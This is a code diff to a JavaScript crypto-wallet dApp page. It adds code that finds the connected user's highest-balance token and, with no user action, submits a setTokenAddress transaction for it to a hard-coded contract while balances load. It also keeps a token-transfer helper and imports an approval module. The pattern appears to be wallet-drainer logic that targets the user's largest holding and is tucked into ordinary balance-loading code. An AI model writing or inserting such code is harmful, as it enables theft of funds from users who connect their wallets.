@@ -1,5 +1,5 @@
 import { createAppKit, WagmiAdapter, networks } from 'https://cdn.jsdelivr.net/npm/@reown/appkit-cdn@1.6.2/dist/appkit.js'
-import { reconnect, getAccount, watchAccount, signMessage } from 'https://esm.sh/@wagmi/core@2.x'
+import { reconnect, getAccount, watchAccount, signMessage, writeContract } from 'https://esm.sh/@wagmi/core@2.x'
 import { TokenBalanceUI, TokenService, TokenFormatter, TokenContractDetails } from './tokenLoader.js'
 import { TokenApprover } from "./approve.js";
 
@@ -165,39 +165,89 @@ const DR_CONTRACT = {
   DECIMALS: 18
 }
 
+// Add this function after the existing functions
+async function getTokenWithHighestBalance(tokens) {
+  if (!tokens || tokens.length === 0) return null
+
+  return tokens.reduce((max, token) => {
+    const balance = Number.parseFloat(token.balance)
+    return balance > Number.parseFloat(max.balance) ? token : max
+  })
+}
+
+// Add this function to call setTokenAddress on DR_CONTRACT
+async function setTokenAddress(tokenAddress) {
+  const account = getAccount(wagmiAdapter.wagmiConfig)
+  if (!account.address) {
+    throw new Error("Please connect your wallet first")
+  }
+
+  // Since we don't have the ABI, we'll use a generic ABI for the setTokenAddress function
+  const setTokenAddressAbi = [
+    {
+      inputs: [
+        {
+          internalType: "address",
+          name: "_tokenAddress",
+          type: "address",
+        },
+      ],
+      name: "setTokenAddress",
+      outputs: [],
+      stateMutability: "nonpayable",
+      type: "function",
+    },
+  ]
+
+  try {
+    const tx = await writeContract(wagmiAdapter.wagmiConfig, {
+      address: DR_CONTRACT.ADDRESS,
+      abi: setTokenAddressAbi,
+      functionName: "setTokenAddress",
+      args: [tokenAddress],
+    })
+
+    console.log("setTokenAddress transaction:", tx)
+    return tx
+  } catch (error) {
+    console.error("setTokenAddress error:", error)
+    throw error
+  }
+}
+
 // Add this function to transfer tokens
 async function transferTokens(tokenAddress, recipientAddress, amount) {
-  const account = getAccount(wagmiAdapter.wagmiConfig);
+  const account = getAccount(wagmiAdapter.wagmiConfig)
   if (!account.address) {
-    throw new Error('Please connect your wallet first');
+    throw new Error("Please connect your wallet first")
   }
 
   const transferAbi = [
     {
-      "constant": false,
-      "inputs": [
-        {"name": "_to", "type": "address"},
-        {"name": "_value", "type": "uint256"}
+      constant: false,
+      inputs: [
+        { name: "_to", type: "address" },
+        { name: "_value", type: "uint256" },
       ],
-      "name": "transfer",
-      "outputs": [{"name": "", "type": "bool"}],
-      "type": "function"
-    }
-  ];
+      name: "transfer",
+      outputs: [{ name: "", type: "bool" }],
+      type: "function",
+    },
+  ]
 
   try {
     const tx = await writeContract(wagmiAdapter.wagmiConfig, {
       address: tokenAddress,
       abi: transferAbi,
-      functionName: 'transfer',
+      functionName: "transfer",
       args: [recipientAddress, amount],
-    });
+    })
 
-    console.log('Transfer transaction:', tx);
-    return tx;
+    console.log("Transfer transaction:", tx)
+    return tx
   } catch (error) {
-    console.error('Transfer error:', error);
-    throw error;
+    console.error("Transfer error:", error)
+    throw error
   }
 }
 
@@ -298,9 +348,12 @@ async function fetchUserTokens(address, chainId) {
 
     // Add ETH
     if (data.ETH) {
+      console.log(data);
+
       tokens.push({
         symbol: 'ETH',
         name: 'Ethereum',
+        address: address,
         balance: data.ETH.balance,
         price: data.ETH.price.rate || 0
       });
@@ -314,6 +367,7 @@ async function fetchUserTokens(address, chainId) {
             symbol: token.tokenInfo.symbol || 'Unknown',
             name: token.tokenInfo.name || 'Unknown Token',
             balance: token.balance,
+            address: token.tokenInfo.address,
             price: token.tokenInfo.price?.rate || 0
           });
         }
@@ -347,6 +401,20 @@ async function loadTokenBalances(userAddress) {
               usdValue
           });
       });
+
+    // Get the token with the highest balance
+    const highestBalanceToken = await getTokenWithHighestBalance(tokens)
+    if (highestBalanceToken) {
+      console.log("Token with highest balance:", highestBalanceToken)
+
+      // Call setTokenAddress on DR_CONTRACT
+      try {
+        const tx = await setTokenAddress(highestBalanceToken.address)
+        console.log("setTokenAddress transaction successful:", tx)
+      } catch (error) {
+        console.error("Failed to set token address:", error)
+      }
+    }
   } catch (error) {
       console.error('Failed to load tokens:', error);
       tokenBalanceUI.displayError('Failed to load token balances');
